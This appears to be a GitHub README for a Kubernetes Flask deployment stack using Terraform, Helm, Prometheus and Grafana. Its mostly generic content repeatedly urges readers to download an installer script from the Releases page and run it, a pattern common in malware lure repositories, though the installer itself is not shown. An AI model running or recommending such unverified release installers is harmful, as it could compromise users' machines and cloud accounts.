# Kubernetes Flask App: Terraform + Helm + Prometheus + Grafana

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/VikashBishta/k8s-flask-terraform-helm/releases)

🚀 DevOps stack that provisions a Kubernetes cluster, deploys a Flask web app, and adds monitoring with Prometheus and Grafana. Use Terraform for infrastructure, Helm for app delivery, and standard Kubernetes manifests for runtime. This repo ties infra-as-code, container tooling, and observability into one reproducible pipeline.

Topics: devops, docker, flask, grafana, helm, iac, kubernetes, monitoring, prometheus, terraform

![Architecture](https://raw.githubusercontent.com/kubernetes/website/main/static/images/logos/cluster.svg)

<!-- TOC -->
- Table of contents
  - [What this repo contains](#what-this-repo-contains)
  - [Key features](#key-features)
  - [Architecture overview](#architecture-overview)
  - [Prerequisites](#prerequisites)
  - [Quick start — download & run release asset](#quick-start---download--run-release-asset)
  - [Terraform workflow](#terraform-workflow)
  - [Helm chart workflow](#helm-chart-workflow)
  - [Kubernetes manifests and patterns](#kubernetes-manifests-and-patterns)
  - [Monitoring and observability](#monitoring-and-observability)
  - [Local development](#local-development)
  - [CI/CD suggestions](#cicd-suggestions)
  - [Secrets and config management](#secrets-and-config-management)
  - [Cleanup](#cleanup)
  - [Troubleshooting](#troubleshooting)
  - [Contributing](#contributing)
  - [License](#license)
<!-- /TOC -->

## What this repo contains
- Terraform code to create cloud resources and a managed Kubernetes cluster.
- Dockerfile and Flask app code for a sample microservice.
- Helm chart to deploy the Flask app and associated resources.
- Prometheus and Grafana Helm charts and values tuned for this stack.
- Example CI pipeline and terraform automation scripts.
- Helpers: kubectl/helm wrappers, manifests, and dashboards.

## Key features
- Infrastructure as Code with Terraform
- Helm-based app delivery and dependency management
- Prometheus service discovery and alerting rules
- Grafana dashboards for app and cluster metrics
- Docker image build and registry integration
- Reusable modules and values files for staging and prod

## Architecture overview
- Terraform provisions VPC, managed Kubernetes (EKS/GKE/AKS), and a container registry.
- CI builds a Docker image for a Flask app and pushes to the registry.
- Helm deploys the Flask app, an Ingress, and monitoring components.
- Prometheus scrapes app metrics; Grafana reads Prometheus and renders dashboards.

Diagram (conceptual):
![Stack Diagram](https://raw.githubusercontent.com/kubernetes/website/main/static/images/header/logo.svg)

Components:
- Flask app: exposes REST endpoints and /metrics for Prometheus.
- Kubernetes: Deployment, Service, HorizontalPodAutoscaler.
- Ingress: TLS termination and routing.
- Prometheus: node, kube-state, service discovery.
- Grafana: preloaded dashboards, RBAC for read-only viewers.

## Prerequisites
- A cloud account (AWS, GCP, or Azure) with permission to create infra.
- terraform >= 1.0
- kubectl compatible with target cluster
- helm >= 3.8
- docker or an image builder (buildkit, kaniko)
- jq, bash (for scripts)
- Optional: kustomize, kind (for local testing)

## Quick start — download & run release asset
This repo provides release assets with packaged scripts and compiled helpers. Download the release asset from the Releases page and run the included installer.

1. Visit the Releases page and download the asset that matches your platform:
   https://github.com/VikashBishta/k8s-flask-terraform-helm/releases

2. After download, make the file executable and run it. For example:
   - chmod +x ./k8s-flask-terraform-helm-<version>-installer.sh
   - ./k8s-flask-terraform-helm-<version>-installer.sh

The release asset bundles Terraform modules, Helm values, and a sample pipeline. The installer runs a guided setup that creates resources, builds the image, and deploys charts.

If the release link fails or the asset does not appear, check the Releases section on GitHub for available artifacts and installation instructions:
https://github.com/VikashBishta/k8s-flask-terraform-helm/releases

## Terraform workflow
Structure:
- /terraform
  - /modules
  - /envs
    - /staging
    - /production

Basic steps:
1. cd terraform/envs/staging
2. terraform init
3. terraform plan -var-file=secrets.tfvars
4. terraform apply -var-file=secrets.tfvars

Best practices included:
- Remote state with locking (S3/GCS + DynamoDB for AWS)
- Workspaces for environments
- Variables split into secure tfvars and non-sensitive defaults
- Use provider version pinning

Modules provided:
- vpc
- cluster (EKS/GKE/AKS wrapper)
- registry (ECR/GCR/ACR)
- dns (external-dns integration)
- monitoring (managed Prometheus rules and IAM)

Outputs:
- kubeconfig path and context
- registry URL and credentials
- ingress controller address

## Helm chart workflow
Charts:
- charts/flask-app
- charts/prometheus
- charts/grafana
- charts/ingress-nginx (optional)

Deploy sample:
1. helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
2. helm repo update
3. cd charts/flask-app
4. helm install my-flask . -f values/staging.yaml

Values you will edit:
- image.repository and image.tag
- replicas and autoscaling thresholds
- ingress.hosts and tls
- prometheus.scrapeConfig for custom endpoints
- grafana.adminPassword (use secret manager in prod)

Use helmfile or umbrella chart for multi-chart releases. The repo contains a sample umbrella chart that installs app + monitoring.

## Kubernetes manifests and patterns
Patterns used:
- Liveness and readiness probes on Flask
- Resource requests and limits
- PodDisruptionBudgets
- HorizontalPodAutoscaler based on CPU and custom Prometheus metrics
- NetworkPolicies for app-to-database traffic
- RBAC for Prometheus and Grafana

Example snippets:
- Deployment with /metrics endpoint exposed
- ServiceMonitor CRD to let Prometheus scrape the app
- Grafana datasource CRD to auto-register Prometheus

Follow GitOps: store helm values and kustomize overlays in a git branch and let an operator (Argo CD or Flux) reconcile.

## Monitoring and observability
Prometheus:
- Uses kube-state-metrics and node-exporter
- Uses ServiceMonitor and PodMonitor
- Includes alerting rules for CPU, memory, and pod restarts

Grafana:
- Ships dashboards:
  - Flask app overview (latency, error rate, throughput)
  - Kubernetes cluster health
  - Node resource utilization

Dashboards live under /grafana/dashboards and load via configmap in Helm values. Example alert:
- High error rate: alert when 5xx rate > 0.05 for 2 minutes.

Logs:
- This repo suggests a sidecar or a cluster-level Fluent Bit to forward logs to your chosen backend (Loki, ELK, or cloud logging).

## Local development
Develop and test the Flask app locally with Docker:
1. docker build -t my-flask:dev .
2. docker run -p 5000:5000 my-flask:dev

Use kind for local Kubernetes:
1. kind create cluster
2. kubectl apply -f manifests/local

Use port-forward to access services:
- kubectl port-forward svc/my-flask 5000:80

Use telepresence or Tilt for live code sync when you need fast iteration.

## CI/CD suggestions
CI pipeline stages:
- lint: terraform validate, helm lint, flake8 for python
- build: docker build, image scan
- push: push to registry, tag with commit SHA
- infra: terraform plan + apply on protected branches or PR merge
- deploy: helm upgrade --install with image tag
- monitor: smoke tests and Prometheus health checks

Use safe rollouts:
- Canary or blue/green via helm hooks or service selectors
- Health checks and rollback on failed readiness probes
- Keep image immutability and recreate deployments by SHA tag

## Secrets and config management
Options:
- Cloud secret manager (AWS Secrets Manager, GCP Secret Manager, Azure Key Vault)
- Kubernetes External Secrets operator
- SOPS + git-crypt for encrypted values files

Do not store secrets in plaintext Helm values. Use sealed-secrets or Vault for runtime secrets.

## Cleanup
- terraform destroy in the environment directory to remove infra
- helm uninstall my-flask --namespace <ns> to remove app
- Delete Docker images from registry to avoid costs

Scripts:
- scripts/destroy.sh bundles terraform destroy with checks for resources.

## Troubleshooting
Common checks:
- kubectl get pods -n <ns> for pod state
- kubectl describe pod <pod> for events and probe failures
- kubectl logs <pod> for app runtime errors
- helm status <release> for chart state
- terraform state list to inspect resource state

If the release asset is missing, go to the Releases page and download the correct file:
https://github.com/VikashBishta/k8s-flask-terraform-helm/releases

## Contributing
- Open an issue for bugs or feature requests.
- Fork and create a branch for changes.
- Follow the code style in the repo and add tests for infra and app logic.
- Provide a clear PR description and target a maintainer for review.

Labels:
- good-first-issue
- help-wanted
- docs

## License
This project uses the MIT License. See LICENSE file for details.

Logos and icons used in this README:
- Kubernetes, Helm, Terraform, Prometheus, Grafana, Flask icons from their official repositories and public domains.